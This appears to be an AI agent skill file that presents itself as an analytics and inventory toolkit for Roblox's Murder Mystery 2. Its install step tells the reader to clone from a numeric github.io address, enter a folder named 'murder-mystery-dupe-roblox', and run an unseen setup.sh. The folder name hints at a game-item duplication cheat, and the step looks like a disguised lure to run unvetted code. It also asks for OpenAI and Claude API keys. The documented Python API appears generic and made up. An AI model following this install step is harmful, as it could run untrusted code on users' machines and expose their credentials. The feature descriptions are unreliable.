---
name: mm2-roblox-analytics-toolkit
description: Analytics and inventory management toolkit for Murder Mystery 2 on Roblox with data visualization and strategy optimization
triggers:
  - "analyze my MM2 inventory"
  - "track murder mystery 2 statistics"
  - "optimize roblox mm2 knife collection"
  - "generate murder mystery gameplay report"
  - "set up mm2 analytics dashboard"
  - "export roblox mm2 data"
  - "configure murder mystery 2 tracker"
  - "visualize mm2 performance metrics"
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

The MM2 Analytics Toolkit is a comprehensive data analysis and inventory management system for Roblox's Murder Mystery 2 game. It provides analytics dashboards, inventory tracking, strategy optimization, and data visualization capabilities for players looking to enhance their gameplay through data-driven insights.

**Key Capabilities:**
- Inventory cataloging and optimization for knife skins and gamepasses
- Real-time statistics tracking and performance analysis
- Strategic pattern recognition and gameplay recommendations
- Data export in multiple formats (CSV, JSON)
- Multi-language support and cross-platform compatibility

## Installation

### Quick Install (Automated)

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Run automated installer
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt

# Verify installation
python3 main.py --version
```

### System Requirements

- Python 3.9+
- Node.js 16+
- 2GB RAM minimum
- Compatible with Windows 10/11, macOS Ventura+, Ubuntu 22.04+

## Configuration

### Environment Variables

Create a `.env` file in the project root:

```bash
# API Keys (optional for AI-powered features)
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}

# Data Configuration
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true

# Export Settings
EXPORT_FORMAT=json
LOG_LEVEL=INFO
```

### Profile Configuration

Create a profile YAML file (`config/profile.yaml`):

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: ["csv", "json"]
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

## CLI Commands

### Basic Analytics

```bash
# Run analytics on default profile
python3 main.py --mode analytics

# Run with specific profile
python3 main.py --mode analytics --profile mystery_solver_01

# Export results to file
python3 main.py --mode analytics --export stats_2026.json --format json

# Verbose logging
python3 main.py --mode analytics --verbose --log-level DEBUG
```

### Inventory Management

```bash
# Scan inventory
python3 main.py --mode inventory --action scan

# Filter by rarity
python3 main.py --mode inventory --filter rarity=legendary

# Export inventory
python3 main.py --mode inventory --export inventory.csv --format csv
```

### Strategy Analysis

```bash
# Analyze gameplay patterns
python3 main.py --mode strategy --analyze patterns

# Generate recommendations
python3 main.py --mode strategy --recommend --role sheriff

# Compare strategies
python3 main.py --mode strategy --compare aggressive passive
```

### Data Visualization

```bash
# Generate dashboard
python3 main.py --mode visualize --dashboard

# Create specific chart
python3 main.py --mode visualize --chart winrate --timeframe 30days

# Export visualization
python3 main.py --mode visualize --export dashboard.html
```

## Python API Usage

### Basic Analytics Session

```python
from mm2_analytics import AnalyticsEngine, Profile, InventoryManager

# Initialize analytics engine
engine = AnalyticsEngine(
    data_directory="./data/collections",
    refresh_rate=30
)

# Load player profile
profile = Profile.load("mystery_solver_01")

# Run analytics
results = engine.analyze(
    profile=profile,
    mode="comprehensive",
    timeframe="30days"
)

# Access results
print(f"Win Rate: {results.win_rate}%")
print(f"Total Games: {results.total_games}")
print(f"Favorite Role: {results.preferred_role}")
```

### Inventory Management

```python
from mm2_analytics import InventoryManager, Filter

# Initialize inventory manager
inventory = InventoryManager(profile="mystery_solver_01")

# Scan current inventory
items = inventory.scan()

# Filter by category and rarity
knife_skins = inventory.filter(
    category="knife_skins",
    rarity=["legendary", "ancient"]
)

# Get collection statistics
stats = inventory.get_stats()
print(f"Total Items: {stats.total_count}")
print(f"Legendary Items: {stats.legendary_count}")
print(f"Collection Completion: {stats.completion_rate}%")

# Export inventory
inventory.export(
    filepath="inventory_backup.json",
    format="json"
)
```

### Strategy Optimization

```python
from mm2_analytics import StrategyAnalyzer

# Initialize analyzer
analyzer = StrategyAnalyzer(profile="mystery_solver_01")

# Analyze patterns for specific role
patterns = analyzer.analyze_role_patterns(role="sheriff")

# Get recommendations
recommendations = analyzer.get_recommendations(
    role="sheriff",
    priority="win_rate"
)

for rec in recommendations:
    print(f"Strategy: {rec.name}")
    print(f"Confidence: {rec.confidence}%")
    print(f"Description: {rec.description}")
```

### Data Visualization

```python
from mm2_analytics import Visualizer

# Initialize visualizer
viz = Visualizer(profile="mystery_solver_01")

# Create performance chart
chart = viz.create_chart(
    chart_type="line",
    metric="win_rate",
    timeframe="30days"
)

# Generate comprehensive dashboard
dashboard = viz.create_dashboard(
    metrics=["win_rate", "games_played", "role_distribution"],
    export_html=True,
    filepath="dashboard.html"
)

# Export as image
viz.export_chart(chart, "performance.png", format="png")
```

### Data Export

```python
from mm2_analytics import DataExporter

# Initialize exporter
exporter = DataExporter(profile="mystery_solver_01")

# Export to CSV
exporter.export_csv(
    data_type="statistics",
    filepath="stats_2026.csv",
    include_headers=True
)

# Export to JSON
exporter.export_json(
    data_type="inventory",
    filepath="inventory_2026.json",
    pretty_print=True
)

# Bulk export
exporter.bulk_export(
    data_types=["statistics", "inventory", "strategy"],
    output_dir="./exports",
    format="json"
)
```

## Common Patterns

### Automated Daily Analysis

```python
import schedule
import time
from mm2_analytics import AnalyticsEngine, Profile

def daily_analysis():
    engine = AnalyticsEngine()
    profile = Profile.load("mystery_solver_01")
    
    results = engine.analyze(profile, mode="daily_summary")
    
    # Export results
    results.export(f"daily_report_{results.date}.json")
    
    # Send notification (optional)
    if results.win_rate > 75:
        print(f"Great performance! Win rate: {results.win_rate}%")

# Schedule daily at 11:59 PM
schedule.every().day.at("23:59").do(daily_analysis)

while True:
    schedule.run_pending()
    time.sleep(60)
```

### Inventory Value Tracking

```python
from mm2_analytics import InventoryManager, ValueTracker

inventory = InventoryManager(profile="mystery_solver_01")
tracker = ValueTracker()

# Track value over time
current_value = tracker.calculate_total_value(inventory.items)

# Compare with historical data
value_change = tracker.compare_value(
    current_value,
    days_ago=30
)

print(f"Current Value: {current_value}")
print(f"Change (30d): {value_change.percentage}%")
print(f"Trend: {value_change.trend}")
```

### Multi-Profile Comparison

```python
from mm2_analytics import ProfileComparator

comparator = ProfileComparator()

# Load multiple profiles
profiles = [
    comparator.load_profile("player_1"),
    comparator.load_profile("player_2"),
    comparator.load_profile("player_3")
]

# Compare statistics
comparison = comparator.compare(
    profiles=profiles,
    metrics=["win_rate", "games_played", "collection_size"]
)

# Generate leaderboard
leaderboard = comparator.create_leaderboard(
    metric="win_rate",
    order="descending"
)

for rank, player in enumerate(leaderboard, 1):
    print(f"{rank}. {player.username}: {player.win_rate}%")
```

## Advanced Features

### AI-Powered Strategy Suggestions

```python
from mm2_analytics import AIStrategist

# Requires API_OPENAI_KEY or API_CLAUDE_KEY in environment
strategist = AIStrategist(
    api_provider="openai",  # or "claude"
    api_key="${OPENAI_API_KEY}"
)

# Get strategy suggestion
suggestion = strategist.suggest_strategy(
    current_stats=profile.stats,
    preferred_role="sheriff",
    context="struggling with murderer detection"
)

print(f"Suggested Strategy: {suggestion.title}")
print(f"Description: {suggestion.description}")
print(f"Expected Improvement: {suggestion.expected_improvement}%")
```

### Real-Time Data Streaming

```python
from mm2_analytics import LiveTracker

tracker = LiveTracker(profile="mystery_solver_01")

# Start live tracking
tracker.start(refresh_interval=30)

# Subscribe to events
@tracker.on_game_complete
def handle_game_complete(game_data):
    print(f"Game finished: {game_data.result}")
    print(f"Role: {game_data.role}")
    print(f"Duration: {game_data.duration}s")

# Keep running
tracker.run()
```

## Troubleshooting

### Common Issues

**Issue: "Profile not found" error**
```python
# Verify profile exists
from mm2_analytics import Profile

try:
    profile = Profile.load("mystery_solver_01")
except FileNotFoundError:
    # Create new profile
    profile = Profile.create(
        username="mystery_solver_01",
        initialize_defaults=True
    )
    profile.save()
```

**Issue: Data directory not accessible**
```bash
# Check permissions
chmod -R 755 ./data/collections

# Verify path in config
python3 -c "from mm2_analytics import Config; print(Config.data_directory)"
```

**Issue: Export fails with encoding error**
```python
# Specify encoding explicitly
exporter.export_json(
    data_type="inventory",
    filepath="inventory.json",
    encoding="utf-8"
)
```

**Issue: Analytics returning empty results**
```python
# Verify data collection is enabled
engine = AnalyticsEngine(enable_live_tracking=True)

# Check if data exists
if engine.data_exists(profile):
    results = engine.analyze(profile)
else:
    print("No data collected yet. Start playing to gather statistics.")
```

### Performance Optimization

```python
# Use batch processing for large datasets
from mm2_analytics import BatchProcessor

processor = BatchProcessor(
    chunk_size=1000,
    parallel_workers=4
)

results = processor.process_inventory(
    items=inventory.items,
    operation="calculate_value"
)
```

### Debug Mode

```bash
# Enable verbose logging
export LOG_LEVEL=DEBUG

# Run with full diagnostics
python3 main.py --mode analytics --debug --trace
```

## Data Export Formats

### JSON Format
```json
{
  "profile": "mystery_solver_01",
  "timestamp": "2026-05-16T21:56:49Z",
  "statistics": {
    "total_games": 1247,
    "win_rate": 68.5,
    "role_distribution": {
      "innocent": 0.45,
      "sheriff": 0.35,
      "murderer": 0.20
    }
  },
  "inventory": {
    "knife_skins": 47,
    "legendary_count": 8,
    "total_value": 15420
  }
}
```

### CSV Format
```csv
timestamp,profile,metric,value
2026-05-16,mystery_solver_01,win_rate,68.5
2026-05-16,mystery_solver_01,total_games,1247
2026-05-16,mystery_solver_01,knife_skins,47
```

## Best Practices

1. **Regular Backups**: Export data weekly
2. **Profile Management**: Use descriptive profile names
3. **API Rate Limits**: Cache AI suggestions to avoid excessive API calls
4. **Data Privacy**: Keep exported files secure and local
5. **Incremental Analysis**: Use timeframe filters for large datasets

---

**Note**: This toolkit is for analytical purposes only. Always comply with Roblox Terms of Service when collecting and analyzing gameplay data.
